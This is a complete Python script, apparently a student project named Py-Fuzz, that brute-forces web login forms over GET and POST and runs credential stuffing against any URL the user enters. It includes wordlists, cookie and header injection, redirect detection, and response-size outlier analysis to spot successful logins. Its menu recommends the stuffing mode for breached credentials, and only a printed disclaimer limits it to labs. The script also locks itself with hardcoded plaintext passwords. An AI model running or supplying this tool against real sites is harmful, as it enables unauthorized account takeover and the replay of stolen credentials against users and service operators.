"""
Py-Fuzz: A Python-based Fuzzer for Brute-Forcing Login Forms

Reyansh Bansal

This project provided insights into web security and Python development. The author noted the "requests" module’s intuitive nature, drawing parallels to Node.js Express. 
A key technical hurdle involved troubleshooting "302 Redirect" responses, eventually resolved by identifying missing cookies and headers. 
Leveraging GitHub Copilot enhanced the script’s overall robustness and code quality. 
The developer takes pride in successfully engineering a functional fuzzer for brute-forcing login screens. 
Future iterations would include response-matching logic to filter redundant data and accelerate the detection of failed attempts. 
Ultimately, the work demonstrates a strong grasp of HTTP mechanics and the practical application of automation.

January 12, 2026
"""

import requests, time, urllib.parse, re, statistics #requests needed for the script

logins = [
    {"username": "admin", "password" : "allowed"},
    {"username": "reyansh", "password" : "2011"}
] #allowed logins



# This function is for user authentication before accessing the main functionality
# Arguments: None
# Returns: True if authentication is successful, otherwise None
def login():
  """Authenticate user by validating credentials against hardcoded login list."""
  tries = 3
  # Loop until user enters valid credentials or exceeds max attempts
  while tries > 0:
    # Prompt user for username and convert to lowercase
    inputUser = str(input("Enter username: ")).lower()
    # Prompt user for password and convert to lowercase
    inputPass = str(input("Enter password: ")).lower()
    # Validate that both username and password contain only alphanumeric characters
    if not inputUser.isalnum() or not inputPass.isalnum():
      print("invalid creds!")
      continue
    # Search through credentials dictionary for matching username and password
    for i in range(len(logins)):
      if inputUser == logins[i]["username"] and inputPass == logins[i]["password"]:
        print("Authorized")
        return True
    # If no match found, decrement attempts and display error
    else:
      print("invalid creds!")
      tries -= 1


#GET Request brute-force, with options to add cookies/headers and custom param names
#Arguments: The first arguement is for when the user wants to manually craft their own wordlist for usernames, second one is for passwords
#Returns: 0 on completion (all output goes to console)
def GET_REQ(unamelist, passlist):
  overrideUser = str(input("Does the GET request use a username parameter other than 'username': (y/n)")).lower()
  if overrideUser == "y":
    overrideUser = str(input("Enter the username parameter: "))
  else:
    overrideUser = "username"
  
  # Ask user if GET request uses custom password parameter name
  overridePass = str(input("Does the GET request use a password paramter other than 'password': (y/n)")).lower()
  if overridePass == "y":
    overridePass = str(input("Enter the password parameter: "))
  else:
    overridePass = "password"

  # Initialize empty dictionary to store injected cookies
  injected_cookies = {}
  # Loop to collect custom cookies from user
  while True:
    choice = str(input("Do you want to manually inject a specific cookie? (y/n): ").lower())
    if choice == 'n':
      break
      
    if choice == 'y':
      # Get cookie name from user
      cookie_name = str(input("Enter the cookie name (e.g., 'login' or 'session'): "))
      # Get cookie value from user
      raw_val = str(input("Enter cookie value (plaintext or encoded): "))
      # URL encode the cookie value to handle special characters
      encoded_val = urllib.parse.quote(raw_val, safe='')
      # Store encoded cookie in dictionary
      injected_cookies[cookie_name] = urllib.parse.quote(raw_val, safe='')

  # Initialize empty dictionary to store injected headers
  injectHeaders = {}
  # Loop to collect custom headers from user
  while True:
    choice = str(input("Do you want to manually add headers?: (y/n): ")).lower()
    if choice == 'n':
      break
      
    if choice == 'y':
      header_name = str(input("Enter header name: ")).lower()
      header_val = str(input("Enter value of header: ")).lower()
      injectHeaders[header_name] = header_val
    
  # Display wordlist source options to user
  print("Enter method for wordlist: ")
  print("1. Craft your wordlist manually")
  print("2. Use wordlist file")
  print("3. Use default wordlist")
  # Get wordlist method choice from user with error handling
  try:
    method = int(input("> "))
  except:
    print("Invalid input... defaulting to built-in wordlists")
    method = 3
  # Option 1: User manually enters usernames and passwords
  if method == 1:
    unamelist = []
    passlist = []
    # Collect usernames from user input until done
    while True:
      newUser = str(input("Enter a username to add to the wordlist (or type '**done' to finish): "))
      if newUser.lower() == '**done':
        break
      unamelist.append(newUser)
      print("-" * 60)
    # Collect passwords from user input until done
    while True:
      newPass = str(input("Enter a password to add to the wordlist (or type '**done' to finish): "))
      if newPass.lower() == '**done':
        break
      passlist.append(newPass)
      print("-" * 60)
  # Option 2: Load wordlists from external files
  elif method == 2:
    # Load usernames from file with error handling for missing files
    userlistPath = str(input("Enter the file path for your USERNAME wordlist: "))
    unamelist = []
    try:
      with open(userlistPath, 'r') as f:
        for line in f:
          unamelist.append(line.strip())
    except FileNotFoundError:
      print(f"[X] File not found: {userlistPath}")
      print("[!] Defaulting to built-in username wordlist")
      unamelist = wordlistU
    print('-' * 60)
    # Load passwords from file with error handling for missing files
    passlistPath = str(input("Enter the file path for your PASSWORD wordlist: "))
    passlist = []
    try:
      with open(passlistPath, 'r') as f:
        for line in f:
          passlist.append(line.strip())
    except FileNotFoundError:
      print(f"[X] File not found: {passlistPath}")
      print("[!] Defaulting to built-in password wordlist")
      passlist = wordlistP
    print('-' * 60)

  # Initialize list to store response sizes for anomaly detection
  contentBytes = []
  print(f"[*] RUNNING ATTACK ON : {url_target}")
  # Nested loop to test all username/password combinations
  for user in unamelist:
    for passw in passlist:
      # Build payload dictionary with custom parameter names
      payload = {overrideUser: user, overridePass: passw}
      try:
        # Rate limiting delay between requests
        time.sleep(0.2)
        start_time = time.perf_counter()
        # Send GET request with payload, cookies, and headers
        response = requests.get(url_target, params=payload, cookies=injected_cookies, timeout=5, allow_redirects=False, headers=injectHeaders)
        # Record response size and end time
        size = len(response.content)
        end_time = time.perf_counter()
        # Calculate request duration in milliseconds
        duration = (end_time - start_time) * 1000
        page_text = response.text
        # List of keywords that indicate JavaScript redirects
        redirectKeywords = ["window.location", "redirectLocation", "redirect", "newURL"]
        # Only process and display responses with content
        if size > 0:
            # Display response details in formatted table
            print(f'User: {user:10} | Pass: {passw:10} | Size: {size:6} | Time: {duration:.2f}ms | Status: {response.status_code}')
            contentBytes.append(size)
            # Check for HTTP redirect responses
            if response.status_code in [301, 302, 303]:
              location = response.headers.get('Location')
              print(f'[+] FOUND REDIRECT -> {location}')
            # Search response for JavaScript redirect keywords
            for keyword in redirectKeywords:
              if keyword in page_text:
                print(f"\n [INFO]] JAVASCRIPT REDIRECT DETECTED: {user} : {passw}")
                # Extract URL from window.location assignment
                if keyword == "window.location":
                  try:
                    # Parse window.location value and extract URL
                    target_path = page_text.split('window.location=')[1].split(';')[0].strip("'\"").strip("\"").strip("<")
                    # Use regex to extract valid URL from extracted string
                    url_match = re.search(r'https?://[^\s"<>;]+', target_path)
                    if url_match:
                      target_path = url_match.group()
                    print(f"      Redirect Target: {target_path}")
                  except:
                    pass
                  print("-" * 30)
        else:
            # Log empty responses
            print(f'[!] No content returned for {user}')
            contentBytes.append(0)
      except requests.exceptions.RequestException as err:
        # Handle network errors
        print(f"[X] Request Error: {err}")
      
  # Calculate anomalies in response sizes using interquartile range (IQR) method
  if len(contentBytes) > 3:
    # Sort response sizes to calculate quartiles
    sorted_data = sorted(contentBytes)
    # Calculate 25th percentile (Q1)
    q1 = statistics.quantiles(sorted_data, n=4)[0]
    # Calculate 75th percentile (Q3)
    q3 = statistics.quantiles(sorted_data, n=4)[2]
    # Calculate interquartile range
    iqr = q3 - q1
    # Calculate lower outlier boundary (Q1 - 1.5*IQR)
    lower_bound = q1 - 1.5 * iqr
    # Calculate upper outlier boundary (Q3 + 1.5*IQR)
    upper_bound = q3 + 1.5 * iqr
    # Flag to track if any outliers are found
    anomaly_found = False
    # Check each response size against outlier boundaries
    for size in contentBytes:
      if size < lower_bound or size > upper_bound:
        print(f'[!] Outlier detected: {size} bytes')
        anomaly_found = True
    # Report results if no anomalies detected
    if not anomaly_found:
      print("[+] No anomalies detected in response sizes")
      
  elif len(contentBytes) < 3:
    print("[!] Not enough data points to determine outlier bytes.")

  return 0  

#POST Request brute-force, with options to add cookies/headers and custom param names, while they both send the same payload, usually backends check if the request was sent via POST or GET
#Arguments: None
#Returns: 0 on completion (all output goes to console)
def POST_REQ():
  metadata_dictionary = {}
  while True:
    answer = str(input("Do you want to add metadata into the POST request? (y/n)")).lower()
    if answer == 'n':
      print('-' * 30)
      break
    if answer != 'y':
      print("Invalid input, no new metadata added")
      continue

    dataName = str(input("Enter NAME for metadata (name:data): "))
    dataValue = str(input("Enter INFO for metadata (name:data): "))
    metadata_dictionary[dataName] = dataValue
  
  injectHeaders = {}
  isForm = str(input("Does the service use standard HTML form submission? <check DevTools if unsure> (y/n): ")).lower()
  if isForm == 'y':
    injectHeaders["Content-Type"] = "application/x-www-form-urlencoded"
  else:
    injectHeaders["Content-Type"] = "application/json"

  while True:
    ask = str(input("Do you want to use specific headers? (y/n)")).lower()
    if ask == 'n':
      print("No headers added to packet")
      print("-" * 30)
      break
    if ask != 'y':
      print("Invalid input, no new headers added")
      pass
      
    headerName = str(input("Enter NAME for header: "))
    headerValue = str(input("Enter VALUE for header: "))

    injectHeaders[headerName] = headerValue
  
  injectCookie = {}
  while True:
    askUser = str(input("Do you want to inject cookies? (y/n)")).lower()
    if askUser == 'n':
      print("No cookies added to packet")
      print("-" * 30)
      break
    if askUser != 'y':
      print("Invalid input, no new cookies added")
      pass
      
    cookieName = str(input("Enter NAME for cookie: "))
    cookieVal = str(input("Enter VALUE for cookie: "))

    injectCookie[cookieName] = cookieVal
  
  print("[!] FLUSH INJECTION: using ALL metadata sections in one POST request")
  start_time = time.perf_counter()
  try:
    if isForm == 'y':
      response = requests.post(url_target, cookies=injectCookie, timeout=5, allow_redirects=False, data=metadata_dictionary, headers=injectHeaders)
    else:
      response = requests.post(url_target, cookies=injectCookie, timeout=5, allow_redirects=False, json=metadata_dictionary, headers=injectHeaders)
  except requests.exceptions.RequestException as err:
    print(f"[X] Request Error: {err}")
    return

  end_time = time.perf_counter()
  size = len(response.content)
  page_text = response.text

  # Check for redirects in POST response
  redirectKeywords = ["window.location", "redirectLocation", "redirect", "newURL"]
  if size > 0:
    if response.status_code in [301, 302, 303]:
      location = response.headers.get('Location')
      print(f'[+] FOUND REDIRECT -> {location}')
    for keyword in redirectKeywords:
      if keyword in page_text:
        print(f"[INFO] JAVASCRIPT REDIRECT DETECTED")
        if keyword == "window.location":
          try:
            target_path = page_text.split('window.location=')[1].split(';')[0].strip("'\"").strip("\"").strip("<")
            # Extract just the URL using regex
            url_match = re.search(r'https?://[^\s"<>;]+', target_path)
            if url_match:
              target_path = url_match.group()
            print(f"      Redirect Target: {target_path}")
          except:
            pass

  print("-" * 60)
  print("OUTPUT: ")
  print("Response Code:", response.status_code)
  print(f"Response Time (ms): {(end_time - start_time) * 1000:.2f}")
  print(f"Response Size: {size}")
  askForContent = str(input("Would you like to view received content? (y/n)")).lower()
  if askForContent == 'y':
    try:
      print(response.json())
    except ValueError:
      print(page_text)
  if askForContent not in ("y", "n"):
    print("Invalid input... defaulting to NO")
  


  askForText = str(input("Would you like the view the output content for each brute-force attempt? (y/n)")).lower()
  if askForText not in ("y", "n"):
    print("Invalid input... defaulting to NO")
    askForText = 'n'
  print("-" * 60)
  contentBytes = []  # Collect response sizes for anomaly detection
  #Brute-Force each section
  print("[!] STARTING BRUTE-FORCE ATTACK ON EACH METADATA FIELD...")
  for item in metadata_dictionary:
    print(f"[***] BRUTE-FORCING: {item} WITH VALUE: {metadata_dictionary[item]}")
    data = {
      item: metadata_dictionary[item]
    }
    start = time.perf_counter()
    try:
      if isForm == 'y':
        response = requests.post(url_target, cookies=injectCookie, timeout=5, allow_redirects=False, data=data, headers=injectHeaders)
      else:
        response = requests.post(url_target, cookies=injectCookie, timeout=5, allow_redirects=False, json=data, headers=injectHeaders)
    except requests.exceptions.RequestException as err:
      print(f"[X] Request Error: {err}")
      continue
    size = len(response.content)
    contentBytes.append(size)
    end = time.perf_counter()
    print(f"Size: {size} | Time: {(end - start) * 1000:.2f}ms | Status: {response.status_code}")
    if askForText == 'y':
      try:
        print("Response Content: ")
        print(response.json())
      except ValueError:
        print("Response Content: ")
        print(response.text)
    print("-" * 30)
  
  #print(contentBytes)  #debugging line to see content sizes collected
  # Check for anomalies in POST_REQ responses
  if len(contentBytes) > 3:
    sorted_data = sorted(contentBytes)
    q1 = statistics.quantiles(sorted_data, n=4)[0]  # 25th percentile
    q3 = statistics.quantiles(sorted_data, n=4)[2]  # 75th percentile
    iqr = q3 - q1
    lower_bound = q1 - 1.5 * iqr
    upper_bound = q3 + 1.5 * iqr
    
    anomaly_found = False
    for size in contentBytes:
      if size < lower_bound or size > upper_bound:
        print(f'[!] Outlier detected: {size} bytes')
        anomaly_found = True
    
    if not anomaly_found:
      print("[+] No anomalies detected in response sizes")
  elif len(contentBytes) < 3:
    print("[!] Not enough data points to determine outlier bytes.")
  
  return 0

#Credential Stuffing attack via parellel lists in POST requests, with options to add cookies/headers and custom param names
#Arguments: None
#Returns: 0 on completion (all output goes to console)
def CRED_STUFF():
  diyCraft = str(input("Do you want to craft your own wordlists (y/n)")).lower()
  if diyCraft == 'y':
    wordlistU = []
    wordlistP = []
    while True: #username wordlist gen
      newUser = str(input("Enter a username to add to the wordlist (or type '**done' to finish): "))
      if newUser.lower() == '**done':
        break
      wordlistU.append(newUser)
      print("-" * 60)
    while True: #password wordlist gen
      newPass = str(input("Enter a password to add to the wordlist (or type '**done' to finish): "))
      if newPass.lower() == '**done':
        break
      wordlistP.append(newPass)
      print("-" * 60)
  else:
    wordlistPath = str(input("Enter the file path for your USERNAME wordlist: "))
    print('-' * 60)
    wordlistU = []
    try:
      with open(wordlistPath, 'r') as f:
        for line in f:
          wordlistU.append(line.strip())
    except FileNotFoundError:
      print(f"[X] File not found: {wordlistPath}")
      print("[!] Exiting process...")
      return 1
    wordlistPathP = str(input("Enter the file path for your PASSWORD wordlist: "))
    print('-' * 60)
    wordlistP = []
    try:
      with open(wordlistPathP, 'r') as f:
        for line in f:
          wordlistP.append(line.strip())
    except FileNotFoundError:
      print(f"[X] File not found: {wordlistPathP}")
      print("[!] Exiting process...")
      return 1
  
  if len(wordlistU) == 0 or len(wordlistP) == 0:
    print("[X] One or both wordlists are empty: Exiting process...")
    return 1
  elif (len(wordlistU) - len(wordlistP)) == 1 or (len(wordlistP) - len(wordlistU)) == 1:
    print("[! Wordlist length mismatch: Attempting to resize...")
    #add a random word to the shorter list
    if len(wordlistU) > len(wordlistP):
      wordlistP.insert(0, "defaultPass123")
      print(f"[+] Added 'defaultPass123' to PASSWORD wordlist to match lengths")
    else:
      wordlistU.insert(0, "defaultUser123")
      print(f"[+] Added 'defaultUser123' to USERNAME wordlist to match lengths")
  elif not (len(wordlistU) == len(wordlistP)) and len(wordlistU) > 0:
    print('[X] Username and Password lengths must be equal : would you like to truncate the longer list? (y/n)')
    askTrunc = str(input("> ")).lower()
    if askTrunc == 'y':
      if len(wordlistU) > len(wordlistP):
        wordlistU = wordlistU[:len(wordlistP)]
      else:
        wordlistP = wordlistP[:len(wordlistU)]
    elif askTrunc not in ('y', 'n'):
      print("Invalid Input, Exiting process...")
      return 1
    elif askTrunc == 'n':
      askManRemove = str(input("Would you like to manually remove entries from the longer list? (y/n)")).lower()
      if askManRemove == 'y':
        if len(wordlistU) > len(wordlistP):
          print(f"Longer wordlist is the USERNAME list with {len(wordlistU)} entries")
          print("-" * 60)
          print(f"Current USERNAME wordlist: {wordlistU}")
          while True:
            askWhatRemove = str(input("Enter the USERNAME you would like to remove (**done to exit prompt): "))
            if askWhatRemove.lower() == '**done':
              break
            try:
              wordlistU.remove(askWhatRemove)
              print(f"[+] Removed {askWhatRemove} from the USERNAME wordlist")
              print(f"Current USERNAMES wordlist: {wordlistU}")
            except ValueError:
              print(f"[X] {askWhatRemove} not found in the USERNAME wordlist")
        else:
          print(f"Longer wordlist is the PASSWORD list with {len(wordlistP)} entries")
          print("-" * 60)
          print(f"Current PASSWORD wordlist: {wordlistP}")
          while True:
            askWhatRemove = str(input("Enter the PASSWORD you would like to remove (**done to exit prompt): "))
            if askWhatRemove.lower() == '**done':
              break
            try:
              wordlistP.remove(askWhatRemove)
              print(f"[+] Removed {askWhatRemove} from the PASSWORD wordlist")
              print(f"Current PASSWORDS wordlist: {wordlistP}")
            except ValueError:
              print(f"[X] {askWhatRemove} not found in the PASSWORD wordlist")
      elif askManRemove == 'n':
        print("The program requires both wordlists to be equal in length to proceed. Exiting process...")
        return 1
      elif askManRemove not in ('y', 'n'):
        print("Invalid Input, Defaulting to NO...")
        print("-" * 60)
        return 1
  #now both lists are equal in length

  
  userName = str(input("Does the POST request use a username parameter other than 'username': (y/n)")).lower()
  if userName == "y":
    userName = str(input("Enter the username parameter: "))
  else:
    userName = "username"
  
  passWord = str(input("Does the POST request use a password paramter other than 'password': (y/n)")).lower()
  if passWord == "y":
    passWord = str(input("Enter the password parameter: "))
  else:
    passWord = "password"
  print("-" * 60)

  injectHeaders = {}
  isForm = str(input("Does the service use standard HTML form submission? <check DevTools if unsure> (y/n): ")).lower()
  if isForm == 'y':
    injectHeaders["Content-Type"] = "application/x-www-form-urlencoded"
  else:
    injectHeaders["Content-Type"] = "application/json"

  while True:
    ask = str(input("Do you want to use specific headers? (y/n)")).lower()
    if ask == 'n':
      print("No headers added to packet")
      print("-" * 30)
      break
    if ask != 'y':
      print("Invalid input, no new headers added")
      pass
      
    headerName = str(input("Enter NAME for header: "))
    headerValue = str(input("Enter VALUE for header: "))

    injectHeaders[headerName] = headerValue


  print("-" * 60)
  injectCookie = {}
  while True:
    askUser = str(input("Do you want to inject cookies? (y/n)")).lower()
    if askUser == 'n':
      print("No cookies added to packet")
      print("-" * 30)
      break
    if askUser != 'y':
      print("Invalid input, no new cookies added")
      pass
      
    cookieName = str(input("Enter NAME for cookie: "))
    cookieVal = str(input("Enter VALUE for cookie: "))

    injectCookie[cookieName] = cookieVal  
  
  print("-" * 60)
  askForResp = str(input("Would you like to view the response content for each attempt? (y/n)")).lower()
  if askForResp not in ("y", "n"):
    print("Invalid input... defaulting to NO")
    askForResp = 'n'
  
  contentBytes = []  # Collect response sizes for anomaly detection
  #start credential stuffing via parellel list
  print(f"[!] STARTING CREDENTIAL STUFFING ON: {url_target}")
  for i in range(len(wordlistU)):
    user = wordlistU[i]
    passw = wordlistP[i]

    payload = {userName: user, passWord: passw}
    start = time.perf_counter()
    try:
      response = requests.post(url_target, cookies=injectCookie, timeout=5, allow_redirects=False, data=payload, headers=injectHeaders)
    except requests.exceptions.RequestException as err:
      print(f"[X] Request Error: {err} || Credential Pair: {user} : {passw}")
      continue
    
    size = len(response.content)
    contentBytes.append(size)
    end = time.perf_counter()
    duration = (end - start) * 1000
    page_text = response.text
    print(f'User: {user:10} | Pass: {passw:10} | Size: {size:6} | Time: {duration:.2f}ms | Status: {response.status_code}')
    
    # Check for redirects in CRED_STUFF response
    redirectKeywords = ["window.location", "redirectLocation", "redirect", "newURL"]
    if size > 0:
      if response.status_code in [301, 302, 303]:
        location = response.headers.get('Location')
        print(f'[+] FOUND REDIRECT -> {location}')
      for keyword in redirectKeywords:
        if keyword in page_text:
          print(f"[INFO] JAVASCRIPT REDIRECT DETECTED: {user} : {passw}")
          if keyword == "window.location":
            try:
              target_path = page_text.split('window.location=')[1].split(';')[0].strip("'\"").strip("\"").strip("<")
              # Extract just the URL using regex
              url_match = re.search(r'https?://[^\s"<>;]+', target_path)
              if url_match:
                target_path = url_match.group()
              print(f"      Redirect Target: {target_path}")
            except:
              pass
    if askForResp == 'y':
      try:
        text = response.json()
        print("Response Content: ")
        print(text)
      except ValueError:
        print("Response Content: ")
        print(response.text)
    print("-" * 30)
  
  #print(contentBytes)  #debugging line to see content sizes collected
  # Check for anomalies in CRED_STUFF responses
  if len(contentBytes) > 3:
    sorted_data = sorted(contentBytes)
    q1 = statistics.quantiles(sorted_data, n=4)[0]  # 25th percentile
    q3 = statistics.quantiles(sorted_data, n=4)[2]  # 75th percentile
    iqr = q3 - q1
    lower_bound = q1 - 1.5 * iqr
    upper_bound = q3 + 1.5 * iqr
    
    anomaly_found = False
    for size in contentBytes:
      if size < lower_bound or size > upper_bound:
        print(f'[!] Outlier detected: {size} bytes')
        anomaly_found = True
    
    if not anomaly_found:
      print("[+] No anomalies detected in response sizes")
  elif len(contentBytes) < 3:
    print("[!] Not enough data points to determine outlier bytes.")
  
  return 0

  



if __name__ == "__main__": #python entry point
  # Prompt user to login before proceeding
  isLogged = login()
  if isLogged == True:
    version = 1.0
    # Display disclaimer about script usage
    print(" ")
    print("DISCLAIMER: This script is NOT intended for malicious use, only use it in labs or virtual machines. This script is provided AS-IS without any guarantees or warranties. The author is NOT responsible for any misuse or damage caused by this script.")
    print("-" * 60)
    # Display information about script capabilities and limitations
    print("INFO: This script is meant for forms that use USERNAME and PASSWORD forms that use GET/POST requests. More complex login forms (like OAuth, SSO, etc) are NOT supported. This script also assumes you understand basic HTTP packet transwer and web application concepts.")
    print("-" * 60)
    print(f"Welcome! Thank you for using Py-Fuzz Version {version}")
    print("-" * 60)
    print("-" * 60)

    # Prompt user for target URL
    url_target = str(input("Please enter the endpoint url to FUZZ: "))
    
    # Validate URL format
    if not url_target.startswith(('http://', 'https://')):
      print("[X] Invalid URL format. URL must start with http:// or https://")
      exit()
    
    # Initialize default wordlists for brute-force attacks
    wordlistU = ["admin", "123qwerty", "qwerty", "hello", "woah", "testUser", "test"]
    wordlistP = ["admin", "pass", "password", "test", "123qwerty", "imsosmart"]

    # Display attack method options to user
    print("-" * 30)
    print("Which attack would you like to use: \n 1. GET Brute-Force \n 2. POST Brute-Force \n 3. Credential Stuffing (Parellel list in POST requests --> USE IF YOU HAVE BREACHED CREDENTIALS)")

    # Get user's attack method choice with error handling
    try:
      userIn = int(input("> "))
    except:
      print("Invalid input... process terminating")
      exit()
    
    # Execute selected attack method
    if userIn == 1:
      GET_REQ(wordlistU, wordlistP)
    elif userIn == 2:
      POST_REQ()
    elif userIn == 3:
      CRED_STUFF()
    else:
      print("Invalid input... process terminating")
  else:
    # Exit if login fails
    print('Maximum Attempts have been reached: Exiting process...')